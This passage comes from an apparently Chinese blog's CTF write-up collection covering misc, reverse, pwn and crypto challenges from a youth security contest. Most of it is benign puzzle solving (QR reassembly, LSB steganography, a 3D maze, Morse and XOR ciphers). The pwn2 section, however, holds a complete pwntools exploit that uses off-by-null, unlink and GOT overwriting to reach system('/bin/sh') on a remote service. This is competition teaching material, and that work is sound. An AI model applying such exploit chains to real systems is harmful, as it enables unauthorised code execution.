class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]]<br><br><span class="hljs-keyword">import</span> pyzbar.pyzbar <span class="hljs-keyword">as</span> pyzbar<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageDraw <span class="hljs-keyword">as</span> draw<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>shuffle_1 = [<span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>]<br>shuffle_2 = [<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>]<br>head = data[<span class="hljs-number">0</span>:<span class="hljs-number">9</span>]<br>tail = data[<span class="hljs-number">20</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">body</span>(<span class="hljs-params">body_1, body_2</span>):<br>    body = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        body.append(body_1[i])<br>        body.append(body_2[i])<br>    body.append(body_1[<span class="hljs-number">5</span>])<br>    <span class="hljs-keyword">return</span> [data[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> body]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_img</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">29</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data[<span class="hljs-number">0</span>]) == <span class="hljs-number">29</span><br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">31</span>, <span class="hljs-number">31</span>), (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>    <span class="hljs-keyword">for</span> i, row <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data):<br>        <span class="hljs-keyword">for</span> j, pixel <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(row):<br>            img.putpixel((j + <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>), (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">if</span> pixel == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-keyword">with</span> tqdm(total=<span class="hljs-number">720</span> * <span class="hljs-number">120</span>) <span class="hljs-keyword">as</span> pbar:<br>    <span class="hljs-keyword">for</span> body_1 <span class="hljs-keyword">in</span> permutations(shuffle_1):<br>        <span class="hljs-keyword">for</span> body_2 <span class="hljs-keyword">in</span> permutations(shuffle_2):<br>            im = draw_img(head + body(body_1, body_2) + tail)<br>            barcodes = pyzbar.decode(im)<br>            pbar.update(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(barcodes) == <span class="hljs-number">0</span>):<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> barcode <span class="hljs-keyword">in</span> barcodes:<br>                barcodeData = barcode.data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                <span class="hljs-built_in">print</span>(barcodeData)<br>                plt.imshow(im)<br>                plt.show()<br></code></pre></td></tr></table></figure>



<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>binwalk分理出一个压缩包</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-misc3-1.png"></p>
<p>还是lsb解密，密码在图片结尾，<code>7his_1s_p4s5w0rd</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-misc3-2.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-misc3-3.png"></p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>通过gdb动态调试获取地图的全貌</p>
<p>0层<br> 0  1  1  1 1  1  1  1<br> 0  0  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>1层<br> 1  1  1  1 1  1  1  1<br> 1  1  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>2层<br> 1  1  1  1 1  1  1  1<br> 1  1  0  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>3层<br> 1  1  1  1 1  1  1  1<br> 1  1  0  0 1  1  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 1  0  1  1<br> 1  1  1  0 1  1  1  1<br> 1  1  1  0 0  0  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>4层<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>5层<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1</p>
<p>6层<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  0  0<br> 1  1  1  1 1  1  1  0</p>
<p>7层<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  1  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  0  1  1<br> 1  1  1  1 1  1  1  0</p>
<p><code>511=64*7+63</code>所以程序要求从第0层的开头走到第7层的结尾</p>
<p>分别通过<code>a-下，b-上，l-左，r-右，u-下一层，d-上一层</code>进行移动</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-reverse2-1.png"></p>
<p>input: <code>arruuuraaaaarrdbbuuuuuaadrrau</code></p>
<p>flag：<code>flag&#123;6c2a5b75-232d-26ea-c3cc-8f7a924d7357&#125;</code></p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>利用创建<code>chunk</code>时的<code>off by null</code>漏洞，通过<code>chunk3</code>设置<code>chunk4</code>的<code>inuse</code>位为<code>0</code>，这样在释放<code>chunk4</code>时就会触发<code>unlink</code></p>
<p>利用<code>unlink</code>，在<code>chunk_list</code>中写入<code>chunk_list</code>的地址，这样可以达到任意地址读写,需要在合并之前将<code>chunk3</code>的<code>fd-&gt;bk</code>与<code>bk-&gt;fd</code>指向<code>chunk3</code>,<code>chunk3-&gt;fd</code>与<code>chunk3-&gt;bk</code>，就为<code>chunk_list</code>上的地址</p>
<p>然后因为程序中<code>strlen</code>和<code>free</code>都是以<code>chunk</code>为第一个参数，所以可以通过修改<code>got表</code>内<code>free</code>的内容为<code>plt表</code>中的<code>puts</code>，来获取<code>chunk3</code>的<code>fd</code>字段，计算得到<code>libc</code>地址，通过修改<code>got表</code>中的<code>strlen内容</code>为<code>system</code>地址 执行<code>system(&quot;/bin/sh&quot;)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1 ~ 1024):&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br>p=remote(<span class="hljs-string">&#x27;101.200.76.17&#x27;</span>,<span class="hljs-string">&#x27;24195&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./b64heap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>e=ELF(<span class="hljs-string">&#x27;./b64heap&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>strlen_got=e.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>puts_plt=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>chunk_list=<span class="hljs-number">0x6020c0</span><br>heap_list=chunk_list<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>fd=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x18</span><br>bk=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x10</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(fd)+p64(bk)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p64(<span class="hljs-number">0x90</span>))<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#free(3)</span><br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,p64(heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>))<br>edit(<span class="hljs-number">0</span>,p64(heap_list+<span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">3</span>,p64(free_got))<br>edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x80</span>))<br>edit(<span class="hljs-number">0</span>,p64(puts_plt))<br>free(<span class="hljs-number">1</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=d-<span class="hljs-number">0x58</span>-<span class="hljs-number">0x10</span><br><br>system=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(strlen_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">3</span>,p64(strlen_got))<br>edit(<span class="hljs-number">0</span>,p64(system))<br><br>edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;cat flag\n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-pwn2-1.png"></p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h3><p>只有A，B和空格，明显是摩斯<br>将<code>A</code>替换成<code>-</code>，<code>B</code>替换成<code>.</code>，<code>空格</code>替换<code>/</code></p>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">morse</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.codedict=&#123;<span class="hljs-string">&#x27;.-&#x27;</span>:<span class="hljs-string">&quot;a&quot;</span>,<br>                    <span class="hljs-string">&#x27;-...&#x27;</span>:<span class="hljs-string">&quot;b&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-.&#x27;</span>:<span class="hljs-string">&quot;c&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..&#x27;</span>:<span class="hljs-string">&quot;d&quot;</span>,<br>                    <span class="hljs-string">&#x27;.&#x27;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-.&#x27;</span>:<span class="hljs-string">&quot;f&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.&#x27;</span>:<span class="hljs-string">&quot;g&quot;</span>,<br>                    <span class="hljs-string">&#x27;....&#x27;</span>:<span class="hljs-string">&quot;h&quot;</span>,<br>                    <span class="hljs-string">&#x27;..&#x27;</span>:<span class="hljs-string">&quot;i&quot;</span>,<br>                    <span class="hljs-string">&#x27;.---&#x27;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-&#x27;</span>:<span class="hljs-string">&quot;k&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-..&#x27;</span>:<span class="hljs-string">&quot;l&quot;</span>,<br>                    <span class="hljs-string">&#x27;--&#x27;</span>:<span class="hljs-string">&quot;m&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.&#x27;</span>:<span class="hljs-string">&quot;n&quot;</span>,<br>                    <span class="hljs-string">&#x27;---&#x27;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--.&#x27;</span>:<span class="hljs-string">&quot;p&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.-&#x27;</span>:<span class="hljs-string">&quot;q&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.&#x27;</span>:<span class="hljs-string">&quot;r&quot;</span>,<br>                    <span class="hljs-string">&#x27;...&#x27;</span>:<span class="hljs-string">&quot;s&quot;</span>,<br>                    <span class="hljs-string">&#x27;-&#x27;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-&#x27;</span>:<span class="hljs-string">&quot;u&quot;</span>,<br>                    <span class="hljs-string">&#x27;...-&#x27;</span>:<span class="hljs-string">&quot;v&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--&#x27;</span>:<span class="hljs-string">&quot;w&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-&#x27;</span>:<span class="hljs-string">&quot;x&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--&#x27;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..&#x27;</span>:<span class="hljs-string">&quot;z&quot;</span>,<br>                    <span class="hljs-string">&#x27;.----&#x27;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>                    <span class="hljs-string">&#x27;..---&#x27;</span>:<span class="hljs-string">&quot;2&quot;</span>,<br>                    <span class="hljs-string">&#x27;...--&#x27;</span>:<span class="hljs-string">&quot;3&quot;</span>,<br>                    <span class="hljs-string">&#x27;....-&#x27;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>                    <span class="hljs-string">&#x27;.....&#x27;</span>:<span class="hljs-string">&quot;5&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....&#x27;</span>:<span class="hljs-string">&quot;6&quot;</span>,<br>                    <span class="hljs-string">&#x27;--...&#x27;</span>:<span class="hljs-string">&quot;7&quot;</span>,<br>                    <span class="hljs-string">&#x27;---..&#x27;</span>:<span class="hljs-string">&quot;8&quot;</span>,<br>                    <span class="hljs-string">&#x27;----.&#x27;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>                    <span class="hljs-string">&#x27;-----&#x27;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>                    <span class="hljs-string">&#x27;..--..&#x27;</span>:<span class="hljs-string">&quot;?&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-.&#x27;</span>:<span class="hljs-string">&quot;/&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.&#x27;</span>:<span class="hljs-string">&quot;(&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.-&#x27;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....-&#x27;</span>:<span class="hljs-string">&quot;-&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.-.-&#x27;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..--&#x27;</span>:<span class="hljs-string">&#x27;,&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-.-.-.&#x27;</span>:<span class="hljs-string">&#x27;;&#x27;</span>,<br>                    <span class="hljs-string">&#x27;.----.&#x27;</span>:<span class="hljs-string">&#x27;\&#x27;&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetPlain</span>(<span class="hljs-params">self,text</span>):<br>        textlist=text.split(<span class="hljs-string">&#x27;/&#x27;</span>)<br>        detext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> textlist:<br>            detext+=self.codedict[i]<br>        <span class="hljs-keyword">return</span> detext;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">DeBlast</span>(<span class="hljs-params">self,text,detext</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.codedict.keys():<br>            <span class="hljs-keyword">if</span> text.find(i)==<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(text)-<span class="hljs-built_in">len</span>(i))==<span class="hljs-number">0</span>:<br>                    self.delist.append(detext+self.codedict[i])<br>                    <span class="hljs-keyword">continue</span><br>                self.DeBlast(text[<span class="hljs-built_in">len</span>(i):],detext+self.codedict[i])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text,seg=<span class="hljs-string">&#x27;/&#x27;</span>,point=<span class="hljs-string">&#x27;.&#x27;</span>,hor=<span class="hljs-string">&#x27;-&#x27;</span>,blast=<span class="hljs-number">0</span>,out=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            key[0]==&#x27;.&#x27;</span><br><span class="hljs-string">            key[1]==&#x27;-&#x27;</span><br><span class="hljs-string">            key[2]==&#x27;/&#x27;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        key=[point,hor,seg]<br>        div=[<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]<br>        <span class="hljs-keyword">if</span> blast==<span class="hljs-number">0</span>:<br>            self.detext=self.GetPlain(text)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-built_in">print</span>(self.detext)<br>            <span class="hljs-keyword">return</span> self.detext<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                text=text.replace(key[i],div[i])<br>            self.delist=[]<br>            self.DeBlast(text,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.delist:<br>                        <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> self.delist<br>m=morse()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;classicCrypto.txt&#x27;</span>)<br>d=f.read().splitlines()<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e=e+m.decode(i)+<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-crypto1-1.png"></p>
<p>在<a href="https://quipqiup.com/%E7%88%86%E7%A0%B4">https://quipqiup.com/爆破</a></p>
<p><code>cryptography is the practice and study of techniques for secure communication in the presence of adversarial behavior, which is divided into classical cryptography and modern cryptography. the main classical cipher types are transposition ciphers, which rearrange the order of letters in a message. an early substitution cipher was the caesar cipher, in which each letter in the plaintext was replaced by a letter some fixed number of positions further down the alphabet. since the development of rotor cipher machines in world war i and the advent of computers in world war ii, cryptography methods have become increasingly complex and its applications more varied. modern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions. the growth of cryptographic technology has raised a number of legal issues in the information age. cryptography&#39;s potential for use as a tool for espionage and sedition has led many governments to classify it as a weapon and to limit or even prohibit its use and export. in some jurisdictions where the use of cryptography is legal, laws permit investigators to compel the disclosure of encryption keys for documents relevant to an investigation. cryptography also plays a major role in digital rights management and copyright infringement disputes in regard to digital media.the flag is 1d817f23-4e20-9405-bf6d-e83d055316d6, please add flag string and braces yourself, and all letters are lowercase.</code></p>
<p>得到flag：<code>1d817f23-4e20-9405-bf6d-e83d055316d6</code></p>
<h3 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h3><p>将题目给出的字符串进行栅栏后发现与flag形式接近</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-crypto2-2.png"></p>
<p>根据flag的格式发现整个字符串需要异或32，根据题目描述的uuid格式，发现flag中小写的<code>l</code>为<code>-</code>，所以原先小写的字符在异或32的基础上还要减去31</p>
<p>解题脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;FvLFArGp[ovpxBpsssD]qCElwwoClsoColwpuvlqFv&quot;</span><br>b=<span class="hljs-string">&quot;FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-keyword">if</span> i.islower():<br>        e=e+<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)-<span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">else</span>:<br>        e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qwb/qwbqsn-crypto2-1.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title>第五届浙江省大学生网络与信息安全竞赛初赛-WP</title>
    <url>/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B-wp.html</url>
    <content><![CDATA[<h1 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h1><p>Rml</p>
<p>Rank: 32</p>
<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="nisc-easyweb"><a href="#nisc-easyweb" class="headerlink" title="nisc_easyweb"></a>nisc_easyweb</h3><p>访问<code>/robots.txt</code>，发现<code>/api/record</code>，访问后到<code>/test_api.php</code>，F12得到<code>i=FlagInHere</code>，按题目要求get传参拿到flag</p>
